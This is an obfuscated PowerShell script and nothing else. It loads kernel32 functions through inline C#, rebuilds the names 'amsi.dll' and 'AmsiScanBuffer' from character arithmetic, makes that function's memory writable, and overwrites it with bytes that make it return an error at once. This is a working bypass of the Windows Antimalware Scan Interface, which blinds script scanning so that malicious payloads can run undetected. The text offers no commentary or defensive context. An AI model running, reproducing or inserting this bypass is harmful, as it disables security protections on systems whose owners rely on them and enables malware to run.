$A1ZaNVaNRFm3wCrAiJ3 = @"
using System;
using System.Runtime.InteropServices;
public class A1ZaNVaNRFm3wCrAiJ3 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr KTL67vcC5g5gRqeH4Hsu, string rluC);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr xI0Kc_xF0w8, UIntPtr ReXsZ5t5x1R0TMSzV1, uint JKNyY85Yqd1, out uint l_zGm0Ooscm28t);
}
"@

Add-Type $A1ZaNVaNRFm3wCrAiJ3

$WgN = [A1ZaNVaNRFm3wCrAiJ3]::LoadLibrary("$([cHaR](17+80)+[cHAr]([bYtE]0x6d)+[ChAr]([Byte]0x73)+[char]([bytE]0x69)+[CHar]([BYte]0x2e)+[CHAR](100)+[ChAR]([ByTe]0x6c)+[ChAr](108))")
$UZ9gRoFgPWUu = [A1ZaNVaNRFm3wCrAiJ3]::GetProcAddress($WgN, "$(('ÃmsíScãnBúff'+'èr').norMaLiZE([ChAr](70+26-26)+[cHAR](47+64)+[CHar](114)+[ChaR](109+99-99)+[CHaR](22+46)) -replace [chaR]([ByTE]0x5c)+[ChAr](112*2/2)+[CHAr](123)+[chaR](77*61/61)+[CHaR](21+89)+[Char](125+74-74))")
$p = 0
[A1ZaNVaNRFm3wCrAiJ3]::VirtualProtect($UZ9gRoFgPWUu, [uint32]5, 0x40, [ref]$p)
$eQZ4eI2b6mW6 = "0xB8"
$WnxZ9lTaVaY = "0x57"
$RL8IJ = "0x00"
$y5tEp3YLe9QHD7O2 = "0x07"
$qUMTj7mRl = "0x80"
$TJgCD5Tt6K = "0xC3"
$JT_2bSQyOldTK_aS = [Byte[]] ($eQZ4eI2b6mW6,$WnxZ9lTaVaY,$RL8IJ,$y5tEp3YLe9QHD7O2,+$qUMTj7mRl,+$TJgCD5Tt6K)
[System.Runtime.InteropServices.Marshal]::Copy($JT_2bSQyOldTK_aS, 0, $UZ9gRoFgPWUu, 6)